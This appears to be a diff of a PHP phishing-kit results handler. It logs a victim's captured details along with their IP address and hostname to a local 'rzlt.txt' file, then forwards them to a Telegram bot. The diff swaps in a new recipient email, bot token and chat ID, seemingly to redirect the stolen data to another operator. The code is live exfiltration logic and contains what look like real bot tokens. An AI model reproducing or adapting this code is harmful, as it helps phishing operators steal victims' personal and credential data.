@@ -16,7 +16,7 @@ $hostname = gethostbyaddr($ip);
 	$message .= "IP :   $ip | $hostname\n";
 
 	
-	$to = "boxmedia34@gmail.com";
+	$to = "@gmail.com";
 
 
 	
@@ -28,9 +28,9 @@ $Txt_Rezlt = fopen('../rzlt.txt', 'a+');
 fwrite($Txt_Rezlt, $message);
 fclose($Txt_Rezlt);
 
-$token = "1382145052:AAGsO00WvsBBNfT5ALBEX8h0JLx8XrYpUpg";
+$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
 
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1239437517&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-791509674&text=" . urlencode($message)."" );
 
 
 
